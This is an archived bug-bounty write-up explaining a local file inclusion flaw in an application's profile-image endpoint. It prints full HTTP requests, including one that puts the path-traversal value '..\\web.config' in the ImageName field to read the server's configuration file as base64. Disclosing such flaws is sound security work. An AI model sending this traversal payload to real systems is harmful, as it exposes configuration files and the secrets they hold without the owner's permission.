---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-19_local-file-inclusion-interesting-method.md
original_filename: 2022-07-19_local-file-inclusion-interesting-method.md
title: Local File Inclusion (interesting method)
category: documents
detected_topics:
- path-traversal
- access-control
- command-injection
- file-upload
- otp
- cors
tags:
- imported
- documents
- path-traversal
- access-control
- command-injection
- file-upload
- otp
- cors
language: en
raw_sha256: f5afe2086230e258906ac712728ac924eba6aa7ec8878e4ac896b1ff6e66dc9f
text_sha256: 796d0d816125b5f2305eb61170be951f4eda9aaf5572e116e38b447b793b20fa
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# Local File Inclusion (interesting method)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-19_local-file-inclusion-interesting-method.md
- Source Type: markdown
- Detected Topics: path-traversal, access-control, command-injection, file-upload, otp, cors
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `f5afe2086230e258906ac712728ac924eba6aa7ec8878e4ac896b1ff6e66dc9f`
- Text SHA256: `796d0d816125b5f2305eb61170be951f4eda9aaf5572e116e38b447b793b20fa`


## Content

---
title: "Local File Inclusion (interesting method)"
url: "https://captainhoook.medium.com/local-file-inclusion-interesting-method-8263c2cb7cd2"
authors: ["Captain hook"]
bugs: ["LFI"]
publication_date: "2022-07-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2426
scraped_via: "browseros"
---

# Local File Inclusion (interesting method)

Local File Inclusion (interesting method)
Captain hook
Follow
3 min read
·
Jul 16, 2022

51

3

H
ello researchers, This is Captain_hook and I decide to Share An interesting LFI vulnerability That I found In BC’s program.

So as I know that You already know What is LFI, I didn’t Copy/Paste what it is. But you can find out Here.

Scenario

After Installing the Application from its binaries the instance was reachable at the localhost:8020, I dived into the Dashboard section and I see the Avatar’s File Upload functionality.

I tried some file upload Scenarios to upload something malicious BUT all of them were lost. After a while, I found something interesting to test in the request.

The Post request For setting the avatar was like this:

POST /api/Profile/Image HTTP/1.1
Host: localhost:8020
Content-Length: 17889
Accept: application/json
Authorization: Bearer [TOKEN]
Content-Disposition:  form-data; name=""
User-Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like  Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***Origin: http://localhost:8010
Referer: http://localhost:8010/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8,de;q=0.7
Connection: close
------***REDACTED-SUSPECT-TOKEN***Content-Disposition: form-data; name="uploadFile";  filename="20201179525SECURITYADMIN.jpg"
Content-Type:  image/jpeg
ÿØÿà.....

Right after posting this request, another request was sent for locating the uploaded image:

POST /api/Profile/Profile HTTP/1.1
Host: localhost:8020
Content-Length: 86
Access-Control-Allow-Origin: *
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like  Gecko) Chrome/87.0.4280.88 Safari/537.36
Origin: http://localhost:8010
Referer: http://localhost:8010/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8,de;q=0.7
Connection: close
{"UserId":"SECURITYADMIN","ImageName":"YOUR_IMAGE_UNIQUE_NAME"}

The ImageName in the above request is my targeted parameter to test.

Get Captain hook’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I changed the value of ImageName to something invalid and this happened when you opened the image.

Press enter or click to view image in full size

This behavior tells me there is no such file or image in the directory. So what happened if I pass the valid path to the ImageName parameter.

The behavior of the application, in this case, is divided into 2 behaviors:

A) A page with this URI showed up unsafe:data:image/jpeg:base64,.. ( which means the file or the path is invalid or does not exist)

B) A page with this URI showed up data:image/jpeg:base64,… ( It is a black page and it's like this:)

Press enter or click to view image in full size

This Behavior tells that the file or the path does exist, and the image fetcher converted the content of the file into Base64 and put it on the URI scheme.

For example for retrieving the web.config of the application:

POST /api/Profile/Profile HTTP/1.1
Host: localhost:8020
Content-Length: 86
Access-Control-Allow-Origin: *
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like  Gecko) Chrome/87.0.4280.88 Safari/537.36
Origin: http://localhost:8010
Referer: http://localhost:8010/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8,de;q=0.7
Connection: close
{"UserId":"TN2","ImageName":"..\\web.config"}

The response to this request was like the B behavior that I mentioned before. Then I started to decode the base64 URI scheme and I saw this:

Press enter or click to view image in full size

The content of the web.config was decoded and it was valid.

Thanks for reading this article.

Amirmohammad vakili ( captain_hook )
